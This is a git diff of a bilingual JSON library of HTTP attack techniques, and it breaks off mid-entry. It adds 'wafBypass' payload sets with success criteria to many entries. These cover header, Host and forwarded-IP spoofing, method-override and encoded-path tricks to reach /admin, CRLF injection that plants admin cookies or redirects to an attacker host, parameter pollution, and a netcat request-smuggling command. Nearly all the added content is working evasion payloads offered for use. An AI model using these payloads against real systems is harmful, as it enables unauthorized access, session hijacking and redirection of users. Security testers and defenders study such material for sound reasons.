@@ -42,8 +42,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "来源头授权边界",
-        "en": "Source-Header Authorization Boundary"
+        "zh": "路径、方法与可信头授权绕过",
+        "en": "Path, Method & Trusted-Header Authorization Bypass"
       },
       "tutorial": {
         "overview": {
@@ -111,7 +111,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头名大小写变形",
+            "en": "Header-Name Casing"
+          },
+          "command": "printf 'GET /admin HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nREFERER: http://localhost/admin\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 8080",
+          "description": {
+            "zh": "绕过头名精确匹配的清洗：大写 REFERER 仍被服务端规范化识别。成功判据：管理路径返回 200。",
+            "en": "Bypasses exact header-name sanitization since uppercase REFERER still normalizes at the server. Success: admin path returns 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "值编码变形",
+            "en": "Encoded Value Variant"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: http%3A%2F%2Flocalhost%2Fadmin\" http://127.0.0.1:8080/admin",
+          "description": {
+            "zh": "后端二次解码 Referer 时还原可信来源。成功判据：访问控制放行。",
+            "en": "The backend double-decodes the Referer back to a trusted origin. Success: access control passes."
+          }
+        },
+        {
+          "title": {
+            "zh": "双信号不一致",
+            "en": "Inconsistent Dual Signals"
+          },
+          "command": "curl -sS --max-time 5 -H \"Origin: https://localhost\" -H \"Referer: http://0.0.0.0/admin\" http://127.0.0.1:8080/admin",
+          "description": {
+            "zh": "Origin 与 Referer 各自命中不同校验分支的组合绕过。成功判据：任一信号被采信即放行。",
+            "en": "Combining Origin and Referer values that each hit different validation branches. Success: either signal being trusted grants access."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-x-http-method-override",
@@ -152,8 +187,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "方法覆盖头",
-        "en": "Method-Override Headers"
+        "zh": "HTTP 方法与动词覆盖",
+        "en": "HTTP Method & Verb Override"
       },
       "tutorial": {
         "overview": {
@@ -225,6 +260,41 @@
       "tags": [
         "httpbypass",
         "x_http_method_override"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "覆盖头族轮换",
+            "en": "Override Header Family Rotation"
+          },
+          "command": "X-HTTP-Method: DELETE\nX-Method-Override: DELETE\nX-Method: DELETE\nAccess-Control-Request-Method: DELETE",
+          "description": {
+            "zh": "轮换覆盖头族命中实现读取的任一字段。成功判据：请求按 DELETE 语义执行。",
+            "en": "Rotating the override header family hits whichever field the implementation reads. Success: the request executes with DELETE semantics."
+          }
+        },
+        {
+          "title": {
+            "zh": "查询参数伪方法",
+            "en": "Query-Pseudo-Method"
+          },
+          "command": "curl -sS --max-time 5 -X POST \"http://127.0.0.1:8080/api/resource?_method=DELETE&method=DELETE&action=delete\" -d \"x=1\"",
+          "description": {
+            "zh": "查询参数携带伪方法绕过头部级覆盖检查。成功判据：资源被删除。",
+            "en": "Query-string pseudo-methods bypass header-level override checks. Success: the resource is deleted."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与空格变形",
+            "en": "Case & Whitespace Mutation"
+          },
+          "command": "X-HTTP-METHOD-OVERRIDE: delete\nX-HTTP-Method-Override: DELETE \nX-HTTP-Method-Override: %44ELETE",
+          "description": {
+            "zh": "大小写、尾空格与编码值变形绕过头值特征。成功判据：变形值仍触发方法切换。",
+            "en": "Case, trailing space, and encoded value mutations evade header-value signatures. Success: a mutated value still triggers the method switch."
+          }
+        }
       ]
     },
     {
@@ -266,8 +336,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "路径变换与授权",
-        "en": "Path Transformation and Authorization"
+        "zh": "路径、方法与可信头授权绕过",
+        "en": "Path, Method & Trusted-Header Authorization Bypass"
       },
       "tutorial": {
         "overview": {
@@ -336,7 +406,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码路径",
+            "en": "Double-Encoded Path"
+          },
+          "command": "/%2561dmin\n/%2541dmin\n/ad%256Din",
+          "description": {
+            "zh": "绕过一次解码后匹配的 WAF：第二层解码发生在后端路由。成功判据：管理路径返回 200。",
+            "en": "Bypasses WAFs matching after one decode; the second decode happens at backend routing. Success: admin path returns 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "分号与点段组合",
+            "en": "Semicolon & Dot-Segment Combo"
+          },
+          "command": "/;/admin\n/admin;/\n/./admin\n//;/admin",
+          "description": {
+            "zh": "分号参数与单点段组合在代理与后端间产生解析差。成功判据：任一形态命中管理路由。",
+            "en": "Semicolon parameters plus dot-segments create proxy/backend parsing divergence. Success: any form hits the admin route."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码点段路径",
+            "en": "Encoded Dot-Segment Path"
+          },
+          "command": "/%2e/admin\n/admi%6e/%2e\n/%2E%2E/webadmin",
+          "description": {
+            "zh": "编码的 . 与 .. 段绕过字面路径规则。成功判据：规范化后进入管理区域。",
+            "en": "Encoded . and .. segments bypass literal path rules. Success: normalized path enters the admin area."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-http",
@@ -377,8 +482,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "方法级访问控制",
-        "en": "Method-Level Access Control"
+        "zh": "HTTP 方法与动词覆盖",
+        "en": "HTTP Method & Verb Override"
       },
       "tutorial": {
         "overview": {
@@ -446,7 +551,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "任意动词方法",
+            "en": "Arbitrary Verb Method"
+          },
+          "command": "FOOBAR /admin HTTP/1.1\nZZZ /admin HTTP/1.1\nX-ADMIN /admin HTTP/1.1",
+          "description": {
+            "zh": "未知动词回落到默认处理器绕过方法级授权。成功判据：返回管理内容。",
+            "en": "Unknown verbs fall back to default handlers bypassing method-level authorization. Success: admin content returns."
+          }
+        },
+        {
+          "title": {
+            "zh": "小写方法变形",
+            "en": "Lowercase Method Mutation"
+          },
+          "command": "get /admin HTTP/1.1\npost /admin HTTP/1.1",
+          "description": {
+            "zh": "小写方法在部分服务器规范化后仍路由，WAF 特征不命中。成功判据：请求被处理。",
+            "en": "Lowercase methods still route after server normalization while WAF signatures miss. Success: the request is processed."
+          }
+        },
+        {
+          "title": {
+            "zh": "OPTIONS 与 HEAD 旁路",
+            "en": "OPTIONS & HEAD Bypass"
+          },
+          "command": "OPTIONS /admin HTTP/1.1\nHEAD /admin HTTP/1.1\nOPTIONS * HTTP/1.1",
+          "description": {
+            "zh": "旁路方法不经鉴权中间件但泄露信息或执行动作。成功判据：HEAD 返回管理页面头或 OPTIONS 泄露允许方法。",
+            "en": "Bypass verbs skip auth middleware yet leak information or trigger actions. Success: HEAD returns admin page headers or OPTIONS leaks allowed methods."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass--ext",
@@ -487,8 +627,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "转发 IP 头伪造",
-        "en": "Forwarded Client-IP Spoofing"
+        "zh": "路径、方法与可信头授权绕过",
+        "en": "Path, Method & Trusted-Header Authorization Bypass"
       },
       "tutorial": {
         "overview": {
@@ -556,7 +696,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头族轮换伪造",
+            "en": "Header Family Rotation"
+          },
+          "command": "X-Client-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1\nFastly-Client-IP: 127.0.0.1",
+          "description": {
+            "zh": "轮换 CDN/代理专有头命中未被清洗的取值字段。成功判据：任一头使访问控制放行。",
+            "en": "Rotating CDN/proxy-specific headers hits unsanitized extraction fields. Success: any header unlocks access control."
+          }
+        },
+        {
+          "title": {
+            "zh": "多值链伪造",
+            "en": "Multi-Value Chain Forgery"
+          },
+          "command": "X-Forwarded-For: 1.1.1.1, 10.0.0.1\nX-Forwarded-For: 8.8.8.8,127.0.0.1,10.0.0.1",
+          "description": {
+            "zh": "多级链形态使信任段（末位/首段）落入内网地址。成功判据：以内网身份通过。",
+            "en": "Multi-hop chains place the trusted segment (first or last) on an internal address. Success: passes as an internal client."
+          }
+        },
+        {
+          "title": {
+            "zh": "下划线头变体",
+            "en": "Underscore Header Variant"
+          },
+          "command": "X_Forwarded_For: 127.0.0.1\nX_Forwarded_Host: localhost",
+          "description": {
+            "zh": "下划线变体经 nginx 等 underscore 处理差异进入取值。成功判据：变体头被采信。",
+            "en": "Underscore variants slip in via nginx-style underscore handling. Success: the variant header is honored."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-host",
@@ -666,7 +841,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "整数/十六进制/短格式 IP 变形",
+            "en": "Integer/hex/short IP forms"
+          },
+          "command": "Host: 2130706433\nHost: 127.1\nHost: 127.0.1\nHost: 0x7f000001\nHost: 0177.0.0.1\nHost: 2130706433:80\nHost: [::ffff:127.0.0.1]",
+          "description": {
+            "zh": "绕过按 localhost/127.0.0.1 字面黑名单的 Host 校验：整数 2130706433、短格式 127.1、十六进制 0x7f000001、八进制 0177.0.0.1 与 IPv4 映射 IPv6 在解析后均为回环地址而字面不同；成功判据：任一变形命中内部虚拟主机（返回内部面板而非默认站点）。",
+            "en": "Bypasses Host allow/deny lists on the literal localhost/127.0.0.1: integer 2130706433, short 127.1, hex 0x7f000001, octal 0177.0.0.1 and IPv4-mapped IPv6 all parse to loopback with different literals; success criterion: any variant reaches the internal vhost (internal panel instead of the default site)."
+          }
+        },
+        {
+          "title": {
+            "zh": "重复 Host 与列表形态",
+            "en": "Duplicate Host and list forms"
+          },
+          "command": "Host: localhost\nHost: internal\nHost: 127.0.0.1, internal\nHost: internal; localhost",
+          "description": {
+            "zh": "绕过\"仅允许一个 Host 头\"校验缺失的代理链：发两个 Host 头（第一行合规、第二行内部名）或逗号/分号列表，不同层各取其一；成功判据：响应内容与单独发内部 Host 时一致（内部站点被返回）。",
+            "en": "Bypasses proxy chains missing duplicate-Host validation: send two Host headers (compliant first, internal second) or comma/semicolon lists so different hops pick different values; success criterion: the response matches the internal-Host-only request (internal site returned)."
+          }
+        },
+        {
+          "title": {
+            "zh": "尾点与大写/标签变形",
+            "en": "Trailing-dot, case and label variants"
+          },
+          "command": "Host: localhost.\nHost: LOCALHOST\nHost: InTeRnAl\nHost: ADMIN.\nHost: 127.0.0.1.\nHost: internal..admin",
+          "description": {
+            "zh": "绕过大小写敏感或未处理 FQDN 尾点的 Host 规则：RFC 3986 下 localhost. 与 localhost 等价、DNS 大小写不敏感，双标签 internal..admin 部分解析器宽容归一；成功判据：变形仍路由到内部/管理虚拟主机。",
+            "en": "Bypasses Host rules that are case-sensitive or ignore the FQDN trailing dot: localhost. equals localhost per RFC 3986, DNS is case-insensitive, and some parsers tolerate internal..admin; success criterion: variants still route to the internal/admin vhost."
+          }
+        },
+        {
+          "title": {
+            "zh": "转发头等价覆盖",
+            "en": "Forwarded-header equivalent override"
+          },
+          "command": "X-Forwarded-Host: internal\nX-Original-Host: admin\nX-Host: localhost\nForwarded: host=internal\nX-Forwarded-Server: backend",
+          "description": {
+            "zh": "绕过只校验 Host 头而路由层优先取转发头的部署：X-Forwarded-Host/X-Original-Host/X-Host/Forwarded 在反代后端等效决定路由；成功判据：携带转发头的请求返回内部站点内容。",
+            "en": "Bypasses deployments validating only Host while routing honors forwarding headers: X-Forwarded-Host/X-Original-Host/X-Host/Forwarded effectively decide routing behind the reverse proxy; success criterion: requests carrying the forwarding headers return internal site content."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-url",
@@ -707,8 +928,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "内部重写头",
-        "en": "Internal Rewrite Headers"
+        "zh": "路径、方法与可信头授权绕过",
+        "en": "Path, Method & Trusted-Header Authorization Bypass"
       },
       "tutorial": {
         "overview": {
@@ -776,7 +997,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双覆盖头叠加",
+            "en": "Dual Override Headers"
+          },
+          "command": "X-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Override-URL: /admin",
+          "description": {
+            "zh": "多覆盖头并存命中实现读取的任一字段。成功判据：路由按注入路径处理。",
+            "en": "Multiple override headers coexist to hit whichever the implementation reads. Success: routing follows the injected path."
+          }
+        },
+        {
+          "title": {
+            "zh": "值编码变形",
+            "en": "Encoded Value Mutation"
+          },
+          "command": "X-Original-URL: /%61dmin\nX-Rewrite-URL: /adm%69n\nX-Original-URL: /%2f%61dmin",
+          "description": {
+            "zh": "编码路径值绕过头值特征匹配。成功判据：解码后进入管理路由。",
+            "en": "Encoded path values bypass header-value signature matching. Success: decoded into the admin route."
+          }
+        },
+        {
+          "title": {
+            "zh": "尾部填充变形",
+            "en": "Trailing Padding Mutation"
+          },
+          "command": "X-Original-URL: /admin/..;/\nX-Original-URL: /admin/.\nX-Rewrite-URL: /admin%20",
+          "description": {
+            "zh": "尾部点段/分号/空格改变头值特征但规范化等价。成功判据：等效路径生效。",
+            "en": "Trailing dot-segments/semicolons/spaces alter the signature but normalize equivalently. Success: the equivalent path takes effect."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-crlf",
@@ -886,7 +1142,64 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重/三重编码分隔符",
+            "en": "Double/triple-encoded separators"
+          },
+          "command": "%250d%250a\n%250a\n%250d\n%250d%250a%250d%250a\n%25250d%25250a\n%25%30d%25%30a",
+          "description": {
+            "zh": "绕过单次解码匹配 %0d/%0a 的 WAF：应用再解码一层时双重/三重编码还原出真实 CRLF；成功判据：响应头被拆分（出现受控头名或响应体错位）。",
+            "en": "Bypasses WAFs matching %0d/%0a after one decode: double/triple encoding restores real CRLF when the application decodes again; success criterion: the response gets split (controlled header name appears or the body shifts)."
+          }
+        },
+        {
+          "title": {
+            "zh": "过长 UTF-8 序列",
+            "en": "Overlong UTF-8 sequences"
+          },
+          "command": "%c0%8d%c0%8a\n%e0%80%8d%e0%80%8a\n%c4%8d%c4%8a\n%e0%80%8d%e0%80%8d\n%c0%8d%c0%8a%c0%8d%c0%8a",
+          "description": {
+            "zh": "绕过按规范 CR/LF 字节签名匹配的规则：过长 UTF-8 编码（%c0%8d 等）在宽容解码器中还原为 CR/LF；成功判据：任一序列导致响应头被注入/分割。",
+            "en": "Bypasses rules matching canonical CR/LF byte signatures: overlong UTF-8 encodings (%c0%8d etc.) decode to CR/LF on lenient decoders; success criterion: any sequence causes header injection/splitting in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "宽 Unicode/字面转义",
+            "en": "Wide Unicode and literal escapes"
+          },
+          "command": "%u000d%u000a\n%u000a\n%u000D%u000A\n\\u000d\\u000a\n%u000d%u000a%u000d%u000a",
+          "description": {
+            "zh": "绕过不识别 %u 宽转义与反斜杠字面转义的过滤器：IIS 风格 %u000d 与 JSON/JS 风格 \\u000d 在相应解码层还原；成功判据：转义值触达响应层并完成分割。",
+            "en": "Bypasses filters blind to %u wide escapes and backslash literal escapes: IIS-style %u000d and JSON/JS-style \\u000d restore at their decoding layers; success criterion: the escaped value reaches the response layer and completes the split."
+          }
+        },
+        {
+          "title": {
+            "zh": "空字节混合分隔",
+            "en": "Null-byte mixed separators"
+          },
+          "command": "%00%0d%0a\n%0d%00%0a\n%0d%0a%00\n%00%0a\n%0a%00",
+          "description": {
+            "zh": "绕过成对 CRLF 检测与 NUL 截断清洗：NUL 前缀/中缀被部分容器丢弃后剩下有效分隔符；成功判据：响应出现额外头或内容错位。",
+            "en": "Bypasses paired-CRLF detection and NUL-truncating sanitizers: null prefixes/infixes are dropped by some containers leaving valid separators; success criterion: extra headers or shifted content appear in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "字面与编码混排",
+            "en": "Literal and encoded mixes"
+          },
+          "command": "\\r\\n%0d%0a\n%0d%0a\\r\\n\n\\\\r\\\\n\n%0D%0a%5c%72%5c%6e\n%5c%72%5c%6e%0d%0a",
+          "description": {
+            "zh": "绕过只匹配单一形态（纯编码或纯字面 \r\n）的规则：字面转义与 percent 编码拼接后，在模板引擎/双层解码场景下其一被还原；成功判据：混排输入产生响应分割行为。",
+            "en": "Bypasses rules matching a single form (purely encoded or purely literal \r\n): concatenated literal escapes and percent encodings let one layer restore in template engines/double-decode paths; success criterion: a mixed input produces response splitting."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-crlf-set-cookie",
@@ -996,7 +1309,64 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码注入",
+            "en": "Double-encoding injection"
+          },
+          "command": "%250d%250aSet-Cookie:admin=true\n%25250d%25250aSet-Cookie:admin=true\n%250d%250aSet-Cookie:session=admin\n%250D%250ASet-Cookie:role=admin",
+          "description": {
+            "zh": "绕过单次解码匹配 %0d%0aSet-Cookie 的 WAF 规则：二次解码漏洞下双重编码还原；成功判据：响应多出注入的管理 Cookie 行。",
+            "en": "Bypasses WAF rules matching %0d%0aSet-Cookie after one decode: double encoding restores under double-decode flaws; success criterion: an injected admin cookie line appears in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "头名大小写与空白变形",
+            "en": "Header-name case and whitespace variants"
+          },
+          "command": "%0d%0aSET-COOKIE:admin=true\n%0d%0aset-cookie:admin=true\n%0d%0aSet-Cookie:admin=true\n%0d%0aSet-Cookie :admin=true\n%0d%0aSet-Cookie:%09admin=true",
+          "description": {
+            "zh": "绕过对 \"Set-Cookie:\" 精确字面（首字母大写+冒号后无空格）的规则：全大写/全小写、冒号前空格、制表符分隔等形态解析等价；成功判据：任一形态在响应中生效注入。",
+            "en": "Bypasses rules on the exact \"Set-Cookie:\" literal: all-caps/lowercase, space before the colon and tab separators parse equivalently; success criterion: any form successfully injects into the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "值与属性编码变形",
+            "en": "Value and attribute encoding variants"
+          },
+          "command": "%0d%0aSet-Cookie:admin%3Dtrue\n%0d%0aSet-Cookie%3Aadmin=true\n%0d%0aSet-Cookie:admin=true%3B%20Path%3D%2F\n%0d%0aSet-Cookie:admin=true%3B%20Domain%3D.localhost",
+          "description": {
+            "zh": "绕过对 admin=true 与 Path/Domain 明文特征的规则：等号、分号与属性名全部 percent-encode，应用解码后仍是合法 Cookie；成功判据：注入 Cookie 生效且带预期 Path/Domain 作用域。",
+            "en": "Bypasses rules on the plaintext admin=true and Path/Domain features: encoding equals signs, semicolons and attribute names still yields a legal cookie after app decoding; success criterion: the injected cookie takes effect with the intended Path/Domain scope."
+          }
+        },
+        {
+          "title": {
+            "zh": "空字节与 Unicode 变形",
+            "en": "Null-byte and Unicode variants"
+          },
+          "command": "%00%0d%0aSet-Cookie:admin=true\n%0d%00%0aSet-Cookie:admin=true\n%u000d%u000aSet-Cookie:admin=true\n%c0%8d%c0%8aSet-Cookie:admin=true",
+          "description": {
+            "zh": "绕过 NUL 截断与规范编码匹配：NUL 中缀被丢弃、宽/过长编码在宽容层还原 CRLF；成功判据：响应中仍出现注入 Cookie。",
+            "en": "Bypasses NUL truncation and canonical-encoding matching: null infixes are dropped while wide/overlong encodings restore CRLF at lenient layers; success criterion: the injected cookie still appears in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "Cookie 名编码与属性走私",
+            "en": "Cookie-name encoding and attribute smuggling"
+          },
+          "command": "%0d%0aSet-Cookie:%61dmin=true\n%0d%0aSet-Cookie:ADMIN=TRUE\n%0d%0aSet-Cookie:admin=true; Secure; HttpOnly; SameSite=None\n%0d%0aSet-Cookie:admin=true%0d%0aX-Frame-Options:%20ALLOW",
+          "description": {
+            "zh": "绕过对完整 \"Set-Cookie:admin=true\" 串的规则：Cookie 名 percent-encode、全大写或附带标准属性扩展载荷，并在尾部续接第二跳注入（X-Frame-Options）；成功判据：注入 Cookie 生效或额外头出现。",
+            "en": "Bypasses rules on the full \"Set-Cookie:admin=true\" string: percent-encoding the cookie name, all-caps values, appending standard attributes, or chaining a second header (X-Frame-Options) after it; success criterion: the injected cookie takes effect or the extra header appears."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-crlf-location",
@@ -1106,7 +1476,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码注入",
+            "en": "Double-encoding injection"
+          },
+          "command": "%250d%250aLocation:https://{ATTACKER_HOST}\n%25250d%25250aLocation:https://{ATTACKER_HOST}\n%250d%250aLocation:%20https://{ATTACKER_HOST}",
+          "description": {
+            "zh": "绕过匹配 %0d%0aLocation 的规则：双重/三重编码在二次解码场景还原；成功判据：响应 30x 跳转到攻击域。",
+            "en": "Bypasses rules matching %0d%0aLocation: double/triple encoding restores under double-decode scenarios; success criterion: a 30x response redirecting to the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "头名大小写与空白变形",
+            "en": "Header-name case and whitespace variants"
+          },
+          "command": "%0d%0aLOCATION:https://{ATTACKER_HOST}\n%0d%0alocation:https://{ATTACKER_HOST}\n%0d%0aLocation :https://{ATTACKER_HOST}\n%0d%0aLocation:%09https://{ATTACKER_HOST}",
+          "description": {
+            "zh": "绕过对 \"Location:\" 首字母大写字面模板的规则：全大写/全小写、冒号前空格与制表符形态解析等价；成功判据：响应发生跳转或携带注入 Location。",
+            "en": "Bypasses rules on the capitalized \"Location:\" template: all-caps/lowercase, space before the colon and tab forms parse equivalently; success criterion: the response redirects or carries the injected Location."
+          }
+        },
+        {
+          "title": {
+            "zh": "等价跳转头替换",
+            "en": "Equivalent redirect header substitution"
+          },
+          "command": "%0d%0aRefresh:0;url=https://{ATTACKER_HOST}\n%0d%0aContent-Location:https://{ATTACKER_HOST}\n%0d%0aRefresh: 0; url=//{ATTACKER_HOST}",
+          "description": {
+            "zh": "绕过只监控 Location 头的规则：Refresh（元刷新）与 Content-Location 达成同等跳转效果而头名不同，协议相对 URL 再隐藏 scheme；成功判据：浏览器/客户端因注入头跳转到攻击域。",
+            "en": "Bypasses rules monitoring only Location: Refresh (meta-refresh) and Content-Location achieve the same redirect under different header names, with protocol-relative URLs hiding the scheme; success criterion: the client is redirected to the attacker host via the injected header."
+          }
+        },
+        {
+          "title": {
+            "zh": "协议相对与目标编码",
+            "en": "Protocol-relative and target encoding"
+          },
+          "command": "%0d%0aLocation://%0d%0aSet-Cookie:admin=true\n%0d%0aLocation:https://{ATTACKER_HOST}%2f%2e%2e\n%0d%0aLocation:https%3A%2F%2F{ATTACKER_HOST}\n%0d%0aLocation:https://{ATTACKER_HOST}:443%23",
+          "description": {
+            "zh": "绕过对 \"https://攻击域\" 完整 URL 特征的规则：协议相对形式、目标整体 percent-encode、路径编码与端口+片段拼接改变字面而跳转目标不变；成功判据：任一形态触发到攻击域的跳转（或同时注入 Cookie）。",
+            "en": "Bypasses rules on the full \"https://attacker\" URL feature: protocol-relative forms, wholly percent-encoded targets, encoded paths and port+fragment splices change the literal while preserving the redirect destination; success criterion: any form triggers the redirect (and optional cookie injection)."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-host-ext",
@@ -1371,8 +1787,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "JSON 参数污染",
-        "en": "JSON Parameter Pollution"
+        "zh": "参数污染与输入解释差异",
+        "en": "Parameter Pollution & Input Interpretation Divergence"
       },
       "tutorial": {
         "overview": {
@@ -1439,7 +1855,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "嵌套对象覆盖",
+            "en": "Nested Object Override"
+          },
+          "command": "{\"user\":{\"id\":1,\"role\":\"admin\"},\"user\":\"guest\"}\n{\"data\":{\"id\":1},\"id\":2}",
+          "description": {
+            "zh": "嵌套与平铺同名键在不同层取值不同。成功判据：执行层取到 admin 值。",
+            "en": "Nested and flat same-name keys resolve differently per layer. Success: the execution layer reads the admin value."
+          }
+        },
+        {
+          "title": {
+            "zh": "数组键混淆",
+            "en": "Array-Key Confusion"
+          },
+          "command": "{\"id\":[1,2]}\n{\"user\":[\"admin\",\"guest\"],\"role\":[\"user\",\"admin\"]}",
+          "description": {
+            "zh": "数组形态使各层取首/尾元素不一致。成功判据：越权值被采信。",
+            "en": "Array forms make layers disagree on first/last elements. Success: the unauthorized value is honored."
+          }
+        },
+        {
+          "title": {
+            "zh": "Unicode 转义重复键",
+            "en": "Unicode-Escaped Duplicate Keys"
+          },
+          "command": "{\"\\u0072ole\":\"user\",\"role\":\"admin\"}\n{\"\\u0069d\":1,\"id\":2}",
+          "description": {
+            "zh": "转义键与明文键解析后同名的时序差异实现覆盖。成功判据：后键覆盖生效。",
+            "en": "Escaped and plaintext keys collide after parsing, enabling overrides. Success: the later key wins."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-hpp-url",
@@ -1480,8 +1931,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "分隔符解码差异",
-        "en": "Separator Decoding Differential"
+        "zh": "参数污染与输入解释差异",
+        "en": "Parameter Pollution & Input Interpretation Divergence"
       },
       "tutorial": {
         "overview": {
@@ -1549,7 +2000,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码分隔符",
+            "en": "Double-Encoded Separator"
+          },
+          "command": "param=1%2526param=2\nparam=1%253bparam=2\nparam=1%257cparam=2",
+          "description": {
+            "zh": "双重编码分隔符在第二层解码时重新拆分。成功判据：后端取到双参数。",
+            "en": "Double-encoded separators re-split at the second decode layer. Success: the backend receives both parameters."
+          }
+        },
+        {
+          "title": {
+            "zh": "混合分隔符组合",
+            "en": "Mixed Separator Combo"
+          },
+          "command": "param=1%09param=2&x=1\nparam=1%0d%0aparam=2\nparam=1%3dparam%3d2&y=2",
+          "description": {
+            "zh": "tab/CR LF/等号混合命中多种合并策略。成功判据：任一形态产生污染值。",
+            "en": "Tab/CRLF/equals mixes hit various merging strategies. Success: any form yields a polluted value."
+          }
+        },
+        {
+          "title": {
+            "zh": "数组后缀污染",
+            "en": "Array-Suffix Pollution"
+          },
+          "command": "param[]=1&param[]=2\nparam[0]=1&param[1]=2\nparam=1&param[]=2",
+          "description": {
+            "zh": "数组后缀形态触发框架特定的合并语义。成功判据：框架取到攻击者元素。",
+            "en": "Array suffixes trigger framework-specific merge semantics. Success: the framework picks the attacker element."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-cloudflare-xss",
@@ -1699,8 +2185,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "实体编码脚本 URL",
-        "en": "Entity-Encoded Script URLs"
+        "zh": "编码过滤绕过与 Polyglot",
+        "en": "Encoding Bypass & Polyglots"
       },
       "tutorial": {
         "overview": {
@@ -1808,8 +2294,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "脚本协议字符混淆",
-        "en": "Script-Scheme Character Obfuscation"
+        "zh": "编码过滤绕过与 Polyglot",
+        "en": "Encoding Bypass & Polyglots"
       },
       "tutorial": {
         "overview": {
@@ -1918,8 +2404,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "样式上下文脚本执行",
-        "en": "Style-Context Script Execution"
+        "zh": "利用链与数据外带",
+        "en": "Exploitation Chains & Exfiltration"
       },
       "tutorial": {
         "overview": {
@@ -2027,8 +2513,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "模块脚本接收点",
-        "en": "Module-Script Sinks"
+        "zh": "利用链与数据外带",
+        "en": "Exploitation Chains & Exfiltration"
       },
       "tutorial": {
         "overview": {
@@ -2136,8 +2622,8 @@
         "en": "Prototype Pollution"
       },
       "subCategory": {
-        "zh": "客户端原型污染到脚本加载",
-        "en": "Client-Side Prototype Pollution to Script Loading"
+        "zh": "污染利用链到 RCE 与客户端",
+        "en": "Exploitation Chains to RCE & Client-side"
       },
       "tutorial": {
         "overview": {
@@ -2245,8 +2731,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "事件属性覆盖面",
-        "en": "Event-Attribute Coverage"
+        "zh": "反射型与标签变体",
+        "en": "Reflected & Tag Variants"
       },
       "tutorial": {
         "overview": {
@@ -2354,8 +2840,8 @@
         "en": "Request Smuggling"
       },
       "subCategory": {
-        "zh": "Content-Length/Transfer-Encoding 分歧",
-        "en": "Content-Length and Transfer-Encoding Differential"
+        "zh": "CL.TE 与 TE.CL 经典分歧",
+        "en": "CL.TE & TE.CL Differentials"
       },
       "tutorial": {
         "overview": {
@@ -2423,7 +2909,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "小写头部变形",
+            "en": "Lowercase header mutation"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 13\\r\\ntransfer-encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "绕过大小写敏感的 TE 头规则。判据：SMUGGLED 进入下一请求队列。",
